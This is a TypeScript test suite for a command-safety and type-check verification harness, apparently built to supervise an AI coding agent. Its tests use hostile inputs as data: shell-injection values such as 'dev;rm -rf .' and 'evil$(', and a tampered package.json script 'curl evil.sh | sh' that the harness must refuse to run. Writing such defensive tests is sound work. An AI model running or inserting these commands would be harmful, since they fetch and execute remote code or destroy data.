import { describe, expect, test, beforeAll, afterAll } from "bun:test"
import { mkdtemp, rm } from "node:fs/promises"
import * as path from "node:path"
import * as os from "node:os"
import { writeFileSync, mkdirSync, existsSync, readFileSync } from "node:fs"
import { createHash } from "node:crypto"
import { spawnSync } from "node:child_process"
import type { ChildProcess } from "node:child_process"
import {
  Harness,
  MAX_NEW_PER_CHECK,
  MAX_OUTPUT_BYTES,
  OutputCollector,
  classifyComplexity,
  computeDelta,
  detectAutoCommands,
  expandArgvParts,
  formatFindings,
  hashScripts,
  isCommandSafe,
  killProcessTree,
  normalizeErrorSignature,
  parseCommandOutput,
  resolveExecutable,
  runCommand,
  type HarnessOptions,
} from "../src/engine.ts"

// ---------------------------------------------------------------------------
// 1. normalizeErrorSignature
// ---------------------------------------------------------------------------

describe("normalizeErrorSignature", () => {
  test("归一化行号列号 → 相同签名", () => {
    const a = "src/a.ts:12:5 - error TS2322: Type 'X' is not assignable"
    const b = "src/a.ts:99:40 - error TS2322: Type 'X' is not assignable"
    expect(normalizeErrorSignature(a)).toBe(normalizeErrorSignature(b))
    expect(normalizeErrorSignature(a)).toContain(":N:N")
  })

  test("去掉 ANSI 转义和 \\r", () => {
    const raw = "\x1b[31msrc/a.ts:1:2 - error TS1: boom\x1b[0m\r\n"
    const sig = normalizeErrorSignature(raw)
    expect(sig).not.toContain("\x1b")
    expect(sig).not.toContain("\r")
    expect(sig).toContain("TS1")
  })

  test("去掉 ISO 时间戳", () => {
    const raw = "2026-06-20T15:29:01.123Z src/a.ts:1:1 - error TS1: x"
    expect(normalizeErrorSignature(raw)).not.toMatch(/\d{4}-\d{2}-\d{2}/)
  })

  test("不同消息保持不同签名", () => {
    const a = normalizeErrorSignature("src/a.ts:1:1 - error TS1: message one")
    const b = normalizeErrorSignature("src/a.ts:1:1 - error TS2: message two")
    expect(a).not.toBe(b)
  })
})

// ---------------------------------------------------------------------------
// 2. parseCommandOutput
// ---------------------------------------------------------------------------

describe("parseCommandOutput", () => {
  test("tsc 新格式：两条不同错误 → 两个签名", () => {
    const out = [
      "src/a.ts:12:5 - error TS2322: Type 'X' is not assignable",
      "  Type 'string' is not assignable to type 'number'.",
      "",
      "src/b.ts:3:1 - error TS2304: Cannot find name 'foo'",
      "",
    ].join("\n")
    const { sigs, trusted } = parseCommandOutput(out)
    expect(trusted).toBe(true)
    expect(sigs).toHaveLength(2)
    expect(sigs[0]).toContain("TS2322")
    expect(sigs[1]).toContain("TS2304")
  })

  test("同消息不同行 → 相同签名（去重）", () => {
    const out = [
      "src/a.ts:1:1 - error TS1: dup",
      "src/a.ts:99:9 - error TS1: dup",
    ].join("\n")
    const { sigs, trusted } = parseCommandOutput(out)
    expect(trusted).toBe(true)
    expect(sigs).toHaveLength(1)
  })

  test("eslint stylish 格式", () => {
    const out = [
      "src/a.ts",
      "  12:5  error  no-unused-vars  @typescript-eslint/no-unused-vars",
      "  30:1  warning  console.log  no-console",
      "",
      "✖ 2 problems",
    ].join("\n")
    const { sigs, trusted } = parseCommandOutput(out)
    expect(trusted).toBe(true)
    expect(sigs.length).toBeGreaterThanOrEqual(2)
  })

  test("biome 格式", () => {
    const out = "src/a.ts:12:5 lint/suspicious/noDebugger ━━━━━━━━━━━━━━━━━━━━\n  Unexpected debugger statement."
      .replace(/\r/g, "")
    const { sigs, trusted } = parseCommandOutput(out)
    expect(trusted).toBe(true)
    expect(sigs.length).toBeGreaterThanOrEqual(1)
  })

  test("无位置时兜底返回错误行，但 trusted=false（不可建立基线）", () => {
    const out = ["some random text", "ERROR: something broke", "done"].join("\n")
    const { sigs, trusted } = parseCommandOutput(out)
    expect(trusted).toBe(false)
    expect(sigs.length).toBeGreaterThanOrEqual(1)
    expect(sigs[0]).toContain("ERROR")
  })

  test("工具链/配置错误文本（无位置化诊断）不可信", () => {
    const out = "error: config not found\nmake: *** [all] Error 2"
    const { sigs, trusted } = parseCommandOutput(out)
    expect(trusted).toBe(false)
    expect(sigs.length).toBeGreaterThanOrEqual(1)
  })
})

// ---------------------------------------------------------------------------
// 3. computeDelta
// ---------------------------------------------------------------------------

describe("computeDelta", () => {
  test("只返回新签名，保序去重", () => {
    const prev = new Set(["a", "b"])
    const cur = ["b", "c", "a", "c"]
    expect(computeDelta(prev, cur)).toEqual(["c"])
  })

  test("空输入 → 空输出", () => {
    expect(computeDelta(new Set(["a"]), [])).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// 4. classifyComplexity
// ---------------------------------------------------------------------------

const opts = {
  simpleTask: { maxTurnChars: 60, maxDiffFiles: 1, maxDiffLines: 20 },
} as HarnessOptions

describe("classifyComplexity", () => {
  test("短文本 + 小 diff → simple", () => {
    expect(classifyComplexity("修复这个 bug", 1, 5, opts)).toBe("simple")
  })
  test("重构关键词 → complex", () => {
    expect(classifyComplexity("重构整个模块", 1, 5, opts)).toBe("complex")
    expect(classifyComplexity("refactor auth", 0, 0, opts)).toBe("complex")
  })
  test("大 diff → complex", () => {
    expect(classifyComplexity("改一下", 8, 100, opts)).toBe("complex")
  })
  test("默认 → medium", () => {
    expect(classifyComplexity("请实现用户注册登录功能并完善错误处理", 2, 30, opts)).toBe("medium")
  })
})

// ---------------------------------------------------------------------------
// 5. isCommandSafe
// ---------------------------------------------------------------------------

describe("isCommandSafe", () => {
  const prefixes = ["bun", "bunx", "npx", "npm", "pnpm", "yarn", "deno", "tsc", "eslint", "biome"]
  test("白名单内 argv → safe", () => {
    expect(isCommandSafe(["bun", "tsc", "--noEmit"], prefixes).safe).toBe(true)
    expect(isCommandSafe(["npm", "run", "lint"], prefixes).safe).toBe(true)
  })
  test("非白名单可执行文件 → unsafe", () => {
    const r = isCommandSafe(["rm", "-rf", "."], prefixes)
    expect(r.safe).toBe(false)
    expect(r.reason).toContain("rm")
  })
  test("shell 元字符 → unsafe", () => {
    expect(isCommandSafe(["bun", "run", "dev;rm -rf ."], prefixes).safe).toBe(false)
    expect(isCommandSafe(["npx", "evil$("], prefixes).safe).toBe(false)
  })
  test("cmd.exe 特殊字符（% 展开 / ^ 转义 / \" 引号）→ unsafe", () => {
    expect(isCommandSafe(["bun", "run", "dev%PATH%"], prefixes).safe).toBe(false)
    expect(isCommandSafe(["bun", "x", "a^b"], prefixes).safe).toBe(false)
    expect(isCommandSafe(["bun", "run", 'a"b'], prefixes).safe).toBe(false)
  })
  test("Windows shim 后缀（npm.cmd / tsc.exe）可比对白名单", () => {
    expect(isCommandSafe(["npm.cmd", "run", "lint"], prefixes).safe).toBe(true)
    expect(isCommandSafe(["tsc.exe", "--noEmit"], prefixes).safe).toBe(true)
    expect(isCommandSafe(["evil.exe", "x"], prefixes).safe).toBe(false)
  })
  test("空命令 → unsafe", () => {
    expect(isCommandSafe([], prefixes).safe).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// 6. hashScripts
// ---------------------------------------------------------------------------

describe("hashScripts", () => {
  test("确定性 + 与键顺序无关", () => {
    const a = hashScripts({ dev: "vite", build: "tsc" })
    const b = hashScripts({ build: "tsc", dev: "vite" })
    expect(a).toBe(b)
    expect(a).toHaveLength(64)
  })
  test("内容不同 → 哈希不同", () => {
    expect(hashScripts({ dev: "vite" })).not.toBe(hashScripts({ dev: "vite --port 3000" }))
  })
})

// ---------------------------------------------------------------------------
// 7. detectAutoCommands
// ---------------------------------------------------------------------------

describe("detectAutoCommands", () => {
  test("typecheck 脚本展开为 argv", () => {
    const r = detectAutoCommands({ typecheck: "tsc --noEmit", lint: "eslint ." })
    expect(r.typecheck).toEqual(["tsc", "--noEmit"])
    expect(r.lint).toEqual(["eslint", "."])
  })
  test("bun run / bunx 前缀展开", () => {
    const r = detectAutoCommands({ typecheck: "bun run typecheck:ci" })
    expect(r.typecheck).toEqual(["bun", "typecheck:ci", "--noEmit"])
    const b = detectAutoCommands({ typecheck: "bunx tsc" })
    expect(b.typecheck).toEqual(["bun", "x", "tsc", "--noEmit"])
  })
  test("已含 --noEmit 不重复追加；npm run 前缀展开", () => {
    expect(detectAutoCommands({ typecheck: "tsc --noEmit" }).typecheck).toEqual(["tsc", "--noEmit"])
    expect(detectAutoCommands({ typecheck: "npm run typecheck" }).typecheck).toEqual([
      "npm",
      "run",
      "typecheck",
      "--noEmit",
    ])
  })
  test("无匹配 → 空", () => {
    expect(detectAutoCommands({ dev: "vite" }).typecheck).toBeUndefined()
    expect(detectAutoCommands({}).lint).toBeUndefined()
  })
})

describe("expandArgvParts", () => {
  test("bunx / bun run / npm run 归一化", () => {
    expect(expandArgvParts(["bunx", "tsc"])).toEqual(["bun", "x", "tsc"])
    expect(expandArgvParts(["bun", "run", "lint"])).toEqual(["bun", "lint"])
    expect(expandArgvParts(["npm", "run", "lint"])).toEqual(["npm", "run", "lint"])
    expect(expandArgvParts(["pnpm", "lint"])).toEqual(["pnpm", "lint"])
  })
})

// ---------------------------------------------------------------------------
// 8. formatFindings
// ---------------------------------------------------------------------------

describe("formatFindings", () => {
  test("前缀标记 + 截断", () => {
    const long = "src/a.ts:N:N - error TS1: " + "x".repeat(300)
    const f = formatFindings([long], "typecheck")
    expect(f[0].startsWith("🔴")).toBe(true)
    expect(f[0].length).toBeLessThanOrEqual(143)
    const g = formatFindings(["lint:1"], "lint")
    expect(g[0].startsWith("🟡")).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// 9/10. 集成：Harness 全流程 + 安全锁
// ---------------------------------------------------------------------------

describe("Harness 集成", () => {
  let dir = ""
  // 离线可控的"假检查器"：一个 .mjs 脚本输出模拟 tsc 格式错误，命令 = [execPath, script]
  // （argv 无 shell 元字符，能通过白名单校验；脚本内容可改写以模拟"新错误出现"）
  const safePrefixes = [process.execPath]

  beforeAll(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), "lidar-harness-test-"))
  })
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true })
  })

  test("基线采集 → 首轮增量 → 二轮收敛（单调 shown）", async () => {
    mkdirSync(path.join(dir, "proj-a"), { recursive: true })
    const proj = path.join(dir, "proj-a")
    writeFileSync(
      path.join(proj, "package.json"),
      JSON.stringify({ name: "a", scripts: {} }),
    )
    const fakeTcPath = path.join(dir, "fake-tc.mjs")
    writeFileSync(fakeTcPath, "console.error('src/a.ts:1:1 - error TS1000: baseline error')\n")

    const h = new Harness({
      dataDir: path.join(dir, "state"),
      safePrefixes,
      typecheckCmd: [process.execPath, fakeTcPath],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    const baseline = await h.initialize(proj)
    // 基线里应已采集到 ≥1 个类型错误（初始缺陷只作为基线，不报告给模型）
    expect(baseline.typecheckSigs.length).toBeGreaterThanOrEqual(1)

    // 模拟模型改代码后出现"新"错误（基线里没有的）
    writeFileSync(fakeTcPath, "console.error('src/b.ts:2:2 - error TS2000: new error after turn')\n")

    const ev = {
      cwd: proj,
      turnText: "修复类型错误",
      todoCompleted: true,
      gitCommitChanged: false,
      gitFilesChanged: ["b.ts"],
      gitDiffLines: 1,
      force: true,
    }
    const o1 = await h.afterTurn(ev)
    expect(o1.skipped).toBe(false)
    expect(o1.newErrorCount).toBeGreaterThanOrEqual(1)
    expect(o1.needsReview).toBe(false) // 1 < noiseFloor(3)

    // 同一状态再来一轮 → 无新错误，收敛
    const o2 = await h.afterTurn(ev)
    expect(o2.converged).toBe(true)
    expect(o2.newErrorCount).toBe(0)
    expect(o2.totalSeen).toBe(o1.totalSeen)
    await h.dispose()
  })

  test("无信号且非 force → skipped（Tier 1 门控）", async () => {
    const proj = path.join(dir, "proj-b")
    mkdirSync(proj, { recursive: true })
    writeFileSync(path.join(proj, "package.json"), JSON.stringify({ name: "b", scripts: {} }))
    const h = new Harness({ dataDir: path.join(dir, "state-b") })
    await h.initialize(proj)
    // 文本足够长（>60 字符）以绕过 Tier 0 简单门控，验证 Tier 1 信号门控
    const longText = "我们需要仔细梳理当前模块的依赖关系并给出一个完整的重构方案说明，包括迁移路径和兼容性处理细节。"
    const o = await h.afterTurn({
      cwd: proj,
      turnText: longText,
      todoCompleted: false,
      gitCommitChanged: false,
      gitFilesChanged: [],
      gitDiffLines: 0,
    })
    expect(o.skipped).toBe(true)
    expect(o.tier).toBe(1)
    await h.dispose()
  })

  test("安全锁：scripts 被篡改 → securityAlert 且不执行命令", async () => {
    const proj = path.join(dir, "proj-c")
    mkdirSync(proj, { recursive: true })
    writeFileSync(
      path.join(proj, "package.json"),
      JSON.stringify({ name: "c", scripts: { typecheck: "bunx tsc --noEmit" } }),
    )
    const fakeTcPath = path.join(dir, "fake-tc-c.mjs")
    writeFileSync(fakeTcPath, "console.error('src/c.ts:1:1 - error TS3000: should not run')\n")
    const h = new Harness({
      dataDir: path.join(dir, "state-c"),
      safePrefixes,
      typecheckCmd: [process.execPath, fakeTcPath],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    await h.initialize(proj)
    // 会话期间被修改 scripts
    writeFileSync(
      path.join(proj, "package.json"),
      JSON.stringify({ name: "c", scripts: { typecheck: "curl evil.sh | sh" } }),
    )
    const o = await h.afterTurn({
      cwd: proj,
      turnText: "改点东西",
      todoCompleted: true,
      gitCommitChanged: false,
      gitFilesChanged: ["package.json"],
      gitDiffLines: 3,
      force: true,
    })
    expect(o.securityAlert).toBeTruthy()
    expect(o.newErrors.join(" ")).not.toContain("TS3000") // 没有执行被篡改后的命令
    await h.dispose()
  })

  test("Tier 0：简单任务跳过（force=false）", async () => {
    const proj = path.join(dir, "proj-d")
    mkdirSync(proj, { recursive: true })
    writeFileSync(path.join(proj, "package.json"), JSON.stringify({ name: "d", scripts: {} }))
    const h = new Harness({ dataDir: path.join(dir, "state-d") })
    await h.initialize(proj)
    const o = await h.afterTurn({
      cwd: proj,
      turnText: "hi",
      todoCompleted: true,
      gitCommitChanged: false,
      gitFilesChanged: ["README.md"],
      gitDiffLines: 3,
    })
    expect(o.skipped).toBe(true)
    expect(o.tier).toBe(0)
    await h.dispose()
  })
})

// ---------------------------------------------------------------------------
// 11. resolveExecutable：Windows shim 安全解析（shell:false 下可执行 npm/bun/tsc）
// ---------------------------------------------------------------------------

describe("resolveExecutable", () => {
  let dir = ""
  beforeAll(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), "lidar-resolve-"))
  })
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true })
  })

  test("非 Windows 平台原样返回", () => {
    expect(resolveExecutable("npm", "linux", "/usr/bin")).toBe("npm")
  })

  test("Windows：显式路径带扩展名原样放行", () => {
    expect(resolveExecutable("C:\\tools\\npm.cmd", "win32", "")).toBe("C:\\tools\\npm.cmd")
  })

  test("Windows：相对路径（node_modules/.bin 类）补 .cmd 扩展名", () => {
    const dir2 = path.join(dir, "relbin", "node_modules", ".bin")
    mkdirSync(dir2, { recursive: true })
    writeFileSync(path.join(dir2, "eslint.cmd"), "@echo off\r\n")
    expect(resolveExecutable(path.join(dir2, "eslint"), "win32", "")).toBe(path.join(dir2, "eslint.cmd"))
  })

  test("Windows：优先 .exe，其次 .cmd（PATH 查找）", () => {
    const dir2 = path.join(dir, "bin")
    mkdirSync(dir2, { recursive: true })
    writeFileSync(path.join(dir2, "tool.cmd"), "@echo off\r\n")
    expect(resolveExecutable("tool", "win32", dir2)).toBe(path.join(dir2, "tool.cmd"))
    expect(resolveExecutable("tool.cmd", "win32", dir2)).toBe(path.join(dir2, "tool.cmd"))
    writeFileSync(path.join(dir2, "tool.exe"), "")
    expect(resolveExecutable("tool", "win32", dir2)).toBe(path.join(dir2, "tool.exe"))
  })

  test("Windows：找不到 → null（由调用方报告启动失败）", () => {
    expect(resolveExecutable("definitely-missing-exe", "win32", path.join(dir, "empty"))).toBe(null)
  })
})

// ---------------------------------------------------------------------------
// 12. runCommand：输出有界 / 超时杀进程树 / spawn 失败
// ---------------------------------------------------------------------------

describe("runCommand", () => {
  let dir = ""
  beforeAll(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), "lidar-cmd-"))
  })
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true })
  })

  test("输出超过上限被截断且置 truncated（不再无界累积）", async () => {
    const big = path.join(dir, "big.mjs")
    writeFileSync(big, "console.log('x'.repeat(400_000))")
    const r = await runCommand(dir, [process.execPath, big], 30_000)
    expect(r.ok).toBe(true)
    expect(r.truncated).toBe(true)
    expect(r.stdout.length).toBeLessThanOrEqual(MAX_OUTPUT_BYTES)
  })

  test("超时强杀整棵进程树（孙子进程停止产生心跳）", async () => {
    const heartbeat = path.join(dir, "heartbeat.txt")
    const grand = path.join(dir, "grand.mjs")
    writeFileSync(
      grand,
      `import { appendFileSync } from "node:fs"\n` +
        `setInterval(() => appendFileSync(${JSON.stringify(heartbeat)}, "x"), 100)`,
    )
    const parent = path.join(dir, "parent.mjs")
    writeFileSync(
      parent,
      `import { spawn } from "node:child_process"\n` +
        `spawn(process.execPath, [${JSON.stringify(grand)}], { stdio: "ignore" })\n` +
        `setInterval(() => {}, 1000)`,
    )
    const r = await runCommand(dir, [process.execPath, parent], 500)
    expect(r.timedOut).toBe(true)
    // 给强杀留出落地时间：若进程树未被杀死，心跳会持续增长
    await Bun.sleep(700)
    const count1 = readFileSync(heartbeat, "utf8").length
    await Bun.sleep(600)
    const count2 = readFileSync(heartbeat, "utf8").length
    expect(count1).toBeGreaterThan(0)
    expect(count2).toBe(count1)
  }, 15_000)

  test("可执行文件不存在 → code null 且错误信息明确", async () => {
    const r = await runCommand(dir, ["definitely-not-a-real-exe-xyz"], 5_000)
    expect(r.ok).toBe(false)
    expect(r.code).toBe(null)
    expect(r.stderr).toContain("未找到")
  })

  test("空命令 → 立即失败", async () => {
    const r = await runCommand(dir, [], 5_000)
    expect(r.ok).toBe(false)
    expect(r.code).toBe(null)
  })
})

// ---------------------------------------------------------------------------
// 13. Harness 故障分支与语义修复
// ---------------------------------------------------------------------------

describe("Harness 故障分支", () => {
  let dir = ""
  const safePrefixes = [process.execPath]
  const longText =
    "我们需要仔细梳理当前模块的依赖关系并给出一个完整的重构方案说明，包括迁移路径和兼容性处理细节。"
  beforeAll(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), "lidar-fault-"))
  })
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true })
  })
  const mkProj = (name: string): string => {
    const proj = path.join(dir, name)
    mkdirSync(proj, { recursive: true })
    writeFileSync(path.join(proj, "package.json"), JSON.stringify({ name, scripts: {} }))
    return proj
  }
  const evidence = (proj: string, extra: Partial<Parameters<Harness["afterTurn"]>[0]> = {}) => ({
    cwd: proj,
    turnText: longText,
    todoCompleted: true,
    gitCommitChanged: false,
    gitFilesChanged: ["a.ts"],
    gitDiffLines: 3,
    force: true,
    ...extra,
  })

  test("不安全命令：告警进入 shown 只注入一次，但健康度每轮不健康（converged=false / verificationIncomplete=true）", async () => {
    const proj = mkProj("proj-unsafe")
    // "node" 不在默认最小白名单内
    const h = new Harness({ dataDir: path.join(dir, "state-unsafe"), typecheckCmd: ["node", "x.js"], lintCmd: null })
    await h.initialize(proj)
    const o1 = await h.afterTurn(evidence(proj))
    expect(o1.skipped).toBe(false)
    expect(o1.newErrors).toHaveLength(1)
    expect(o1.newErrors[0]).toContain("⚠️")
    expect(o1.baselineIncomplete).toBe(true)
    expect(o1.converged).toBe(false)
    expect(o1.verificationIncomplete).toBe(true)
    // 第二轮：同一告警不再重复注入（展示去重），但健康度持续反映为不完整/未收敛
    const o2 = await h.afterTurn(evidence(proj))
    expect(o2.newErrors).toHaveLength(0)
    expect(o2.converged).toBe(false)
    expect(o2.verificationIncomplete).toBe(true)
    expect(o2.totalSeen).toBeGreaterThanOrEqual(o1.totalSeen)
    await h.dispose()
  })

  test("spawn 失败：告警只注入一次，但每轮 verificationIncomplete=true 且不收敛", async () => {
    const proj = mkProj("proj-spawn")
    const h = new Harness({
      dataDir: path.join(dir, "state-spawn"),
      safePrefixes: ["definitely-missing-exe"],
      typecheckCmd: ["definitely-missing-exe", "arg"],
      lintCmd: null,
    })
    await h.initialize(proj)
    const o1 = await h.afterTurn(evidence(proj))
    expect(o1.newErrors.some((e) => e.includes("无法启动"))).toBe(true)
    expect(o1.baselineIncomplete).toBe(true)
    expect(o1.converged).toBe(false)
    expect(o1.verificationIncomplete).toBe(true)
    const o2 = await h.afterTurn(evidence(proj))
    expect(o2.newErrors).toHaveLength(0)
    expect(o2.converged).toBe(false)
    expect(o2.verificationIncomplete).toBe(true)
    await h.dispose()
  })

  test("超时：告警只注入一次，但每轮 converged=false 且 verificationIncomplete=true", async () => {
    const proj = mkProj("proj-timeout")
    const hang = path.join(dir, "hang.mjs")
    writeFileSync(hang, "setInterval(() => {}, 1000)\n")
    const h = new Harness({
      dataDir: path.join(dir, "state-timeout"),
      safePrefixes,
      typecheckCmd: [process.execPath, hang],
      lintCmd: null,
      commandTimeoutMs: 400,
    })
    await h.initialize(proj)
    const o1 = await h.afterTurn(evidence(proj))
    expect(o1.newErrors.some((e) => e.includes("超时"))).toBe(true)
    expect(o1.converged).toBe(false)
    expect(o1.verificationIncomplete).toBe(true)
    const o2 = await h.afterTurn(evidence(proj))
    expect(o2.newErrors).toHaveLength(0) // 告警只注入一次
    expect(o2.converged).toBe(false)
    expect(o2.verificationIncomplete).toBe(true)
    await h.dispose()
  }, 30_000)

  test("非零退出且无可解析输出：告警只注入一次，但每轮不收敛", async () => {
    const proj = mkProj("proj-nonzero")
    const bad = path.join(dir, "bad.mjs")
    writeFileSync(bad, "console.log('some random junk')\nprocess.exit(3)\n")
    const h = new Harness({
      dataDir: path.join(dir, "state-nonzero"),
      safePrefixes,
      typecheckCmd: [process.execPath, bad],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    const baseline = await h.initialize(proj)
    expect(baseline.typecheckBaselineOk).toBe(false)
    const o1 = await h.afterTurn(evidence(proj))
    expect(o1.newErrors.some((e) => e.includes("非零退出"))).toBe(true)
    expect(o1.converged).toBe(false)
    expect(o1.verificationIncomplete).toBe(true)
    const o2 = await h.afterTurn(evidence(proj))
    expect(o2.newErrors).toHaveLength(0)
    expect(o2.converged).toBe(false)
    expect(o2.verificationIncomplete).toBe(true)
    await h.dispose()
  })

  test("输出截断：告警只注入一次，但每轮不收敛（可能遗漏错误）", async () => {
    const proj = mkProj("proj-trunc")
    const big = path.join(dir, "trunc.mjs")
    writeFileSync(big, "console.log('x'.repeat(300_000))\n")
    const h = new Harness({
      dataDir: path.join(dir, "state-trunc"),
      safePrefixes,
      typecheckCmd: [process.execPath, big],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    const baseline = await h.initialize(proj)
    expect(baseline.typecheckBaselineOk).toBe(false) // 截断的基线被拒绝
    const o1 = await h.afterTurn(evidence(proj))
    expect(o1.newErrors.some((e) => e.includes("截断"))).toBe(true)
    expect(o1.converged).toBe(false)
    expect(o1.verificationIncomplete).toBe(true)
    const o2 = await h.afterTurn(evidence(proj))
    expect(o2.newErrors).toHaveLength(0)
    expect(o2.converged).toBe(false)
    expect(o2.verificationIncomplete).toBe(true)
    await h.dispose()
  }, 30_000)

  test("legacy/损坏状态（空 scripts 哈希）：fail-safe 安全告警且拒绝执行命令", async () => {
    const proj = mkProj("proj-legacy")
    const marker = path.join(dir, "marker-legacy.txt")
    const fakeTcPath = path.join(dir, "fake-tc-legacy.mjs")
    writeFileSync(
      fakeTcPath,
      `import { writeFileSync } from "node:fs"\n` +
        `writeFileSync(${JSON.stringify(marker)}, "ran")\n` +
        `console.error("src/g.ts:1:1 - error TS9000: should not run")\n`,
    )
    const dataDir = path.join(dir, "state-legacy")
    const h = new Harness({ dataDir, safePrefixes, typecheckCmd: [process.execPath, fakeTcPath], lintCmd: null })
    // 预置 legacy 状态：baseline 为 null（旧版本/损坏）
    const key = createHash("sha256").update(proj).digest("hex").slice(0, 16)
    mkdirSync(dataDir, { recursive: true })
    writeFileSync(
      path.join(dataDir, `${key}.json`),
      JSON.stringify({
        projectKey: key,
        cwd: proj,
        baseline: null,
        shownTypecheck: ["旧签名"],
        shownLint: [],
        adaptive: false,
        adaptiveTurns: 0,
        lastRunAt: Date.now(),
      }),
    )
    const o = await h.afterTurn(evidence(proj))
    expect(o.securityAlert).toBeTruthy()
    expect(o.securityAlert).toContain("legacy")
    expect(o.skipped).toBe(true)
    expect(o.tier).toBe(2)
    expect(existsSync(marker)).toBe(false) // 被篡改/未锁定的命令未被执行
    await h.dispose()
  })

  test("adaptive：连续 2 轮无 todo → git-only；无 git 信号跳过，有 git 信号执行", async () => {
    const proj = mkProj("proj-adaptive")
    const fakeTcPath = path.join(dir, "fake-tc-adaptive.mjs")
    writeFileSync(fakeTcPath, "console.error('src/h.ts:1:1 - error TS8000: baseline')\n")
    const h = new Harness({
      dataDir: path.join(dir, "state-adaptive"),
      safePrefixes,
      typecheckCmd: [process.execPath, fakeTcPath],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    await h.initialize(proj)
    const base = {
      cwd: proj,
      turnText: longText,
      todoCompleted: false,
      gitCommitChanged: false,
      gitFilesChanged: [] as string[],
      gitDiffLines: 0,
    }
    const o1 = await h.afterTurn(base)
    expect(o1.skipped).toBe(true)
    expect(o1.tier).toBe(1)
    const o2 = await h.afterTurn(base) // 第 2 轮无 todo → 切换 git-only
    expect(o2.skipped).toBe(true)
    expect(o2.tier).toBe(1)
    expect(o2.phaseSignals.adaptive).toBe(true)
    expect(o2.skipReason).toContain("adaptive")
    // git-only 模式下出现 git 信号 → 正常执行 Tier 2
    writeFileSync(fakeTcPath, "console.error('src/h.ts:1:1 - error TS8001: new after turn')\n")
    const o3 = await h.afterTurn({ ...base, gitFilesChanged: ["h.ts"] })
    expect(o3.skipped).toBe(false)
    expect(o3.phaseSignals.adaptive).toBe(true)
    expect(o3.newErrorCount).toBeGreaterThanOrEqual(1)
    await h.dispose()
  })

  test("基线语义：干净项目（退出码 0 零错误）不算 baselineIncomplete", async () => {
    const proj = mkProj("proj-clean")
    const okTc = path.join(dir, "ok-tc.mjs")
    writeFileSync(okTc, "")
    const h = new Harness({
      dataDir: path.join(dir, "state-clean"),
      safePrefixes,
      typecheckCmd: [process.execPath, okTc],
      lintCmd: null,
    })
    await h.initialize(proj)
    const o = await h.afterTurn(evidence(proj))
    expect(o.baselineIncomplete).toBe(false)
    expect(o.converged).toBe(true)
    await h.dispose()
  })

  test("安全告警在 Tier 0 简单任务跳过时也随结果返回（不丢失）", async () => {
    const proj = mkProj("proj-tier0-alert")
    writeFileSync(
      path.join(proj, "package.json"),
      JSON.stringify({ name: "j", scripts: { typecheck: "bunx tsc --noEmit" } }),
    )
    const fakeTcPath = path.join(dir, "fake-tc-tier0.mjs")
    writeFileSync(fakeTcPath, "console.error('src/j.ts:1:1 - error TS1: baseline')\n")
    const h = new Harness({
      dataDir: path.join(dir, "state-tier0"),
      safePrefixes,
      typecheckCmd: [process.execPath, fakeTcPath],
      lintCmd: null,
    })
    await h.initialize(proj)
    writeFileSync(
      path.join(proj, "package.json"),
      JSON.stringify({ name: "j", scripts: { typecheck: "curl evil.sh | sh" } }),
    )
    const o = await h.afterTurn({ cwd: proj, turnText: "hi", todoCompleted: true, gitCommitChanged: false, gitFilesChanged: [], gitDiffLines: 0 })
    expect(o.skipped).toBe(true)
    expect(o.tier).toBe(0)
    expect(o.securityAlert).toBeTruthy()
    await h.dispose()
  })

  test("单轮注入有上限（MAX_NEW_PER_CHECK），超出部分下轮继续注入", async () => {
    const proj = mkProj("proj-burst")
    const fakeTcPath = path.join(dir, "fake-tc-burst.mjs")
    writeFileSync(fakeTcPath, "") // 基线：干净
    const h = new Harness({
      dataDir: path.join(dir, "state-burst"),
      safePrefixes,
      typecheckCmd: [process.execPath, fakeTcPath],
      lintCmd: null,
      commandTimeoutMs: 30_000,
    })
    await h.initialize(proj)
    const total = MAX_NEW_PER_CHECK + 10
    writeFileSync(
      fakeTcPath,
      Array.from({ length: total }, (_, i) => `console.error(\`src/k${i}.ts:1:1 - error TS${1000 + i}: e${i}\`)`).join("\n"),
    )
    const o1 = await h.afterTurn(evidence(proj))
    expect(o1.newErrorCount).toBe(MAX_NEW_PER_CHECK)
    const o2 = await h.afterTurn(evidence(proj))
    expect(o2.newErrorCount).toBe(total - MAX_NEW_PER_CHECK)
    const o3 = await h.afterTurn(evidence(proj))
    expect(o3.newErrorCount).toBe(0)
    expect(o3.converged).toBe(true)
    expect(o3.verificationIncomplete).toBe(false)
    expect(o3.totalSeen).toBe(total)
    await h.dispose()
  })
})

// ---------------------------------------------------------------------------
// 14. 基线拒绝不可信运行（timedOut / truncated / null code 的部分输出不得入基线）
// ---------------------------------------------------------------------------

describe("基线拒绝不可信运行", () => {
  let dir = ""
  const safePrefixes = [process.execPath]
  beforeAll(async () => {
    dir = await mkdtemp(path.join(os.tmpdir(), "lidar-baseline-"))
  })
  afterAll(async () => {
    await rm(dir, { recursive: true, force: true })
  })
  const mkProj = (name: string): string => {
    const proj = path.join(dir, name)
    mkdirSync(proj, { recursive: true })
    writeFileSync(path.join(proj, "package.json"), JSON.stringify({ name, scripts: {} }))
    return proj
  }

  test("超时且已吐出部分错误签名 → 基线不建立，部分输出不得入基线", async () => {
    const proj = mkProj("b-timeout")
    const tc = path.join(dir, "b-timeout.mjs")
    writeFileSync(
      tc,
      "console.error('src/x.ts:1:1 - error TS1: partial output before hang')\n" +
        "setInterval(() => {}, 1000)\n",
    )
    const h = new Harness({
      dataDir: path.join(dir, "state-b-timeout"),
      safePrefixes,
      typecheckCmd: [process.execPath, tc],
      lintCmd: null,
      commandTimeoutMs: 400,
    })
    const b = await h.initialize(proj)
    expect(b.typecheckBaselineOk).toBe(false)
    expect(b.typecheckSigs).toEqual([]) // 超时前的部分输出被拒绝
    await h.dispose()
  }, 20_000)

